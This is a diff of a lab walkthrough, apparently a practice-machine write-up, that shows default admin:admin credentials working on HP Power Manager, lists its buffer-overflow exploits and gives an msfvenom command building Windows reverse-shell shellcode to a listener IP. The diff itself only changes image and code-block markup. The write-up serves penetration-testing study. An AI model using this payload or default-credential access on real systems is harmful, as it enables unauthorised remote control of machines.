@@ -29,11 +29,11 @@ PORT      STATE SERVICE
 
 Port 80 is running HP Power Manager and it looks vulnerable:
 
-<figure><img src="../../../.gitbook/assets/image (3888).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3888).png>)
 
 `admin:admin` works in logging in:
 
-<figure><img src="../../../.gitbook/assets/image (3887).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3887).png>)
 
 There are a couple of exploits available for this software:
 
@@ -51,11 +51,9 @@ HP Power Manager - 'formExportDataLogs' Remote Buffer Over | cgi/remote/18015.rb
 
 All of them are forms of Buffer Overflow, and I used `10099.py` to exploit it. FIrst, generate the shellcode needed with the bad characters and encoding given in the exploit:
 
-{% code overflow="wrap" %}
 ```
 $ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.191 LPORT=4444 -b "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a" -e x86/alpha_mixed -f c
 ```
-{% endcode %}
 
 Then, replace the shellcode within the Python script and start a listener port.
 
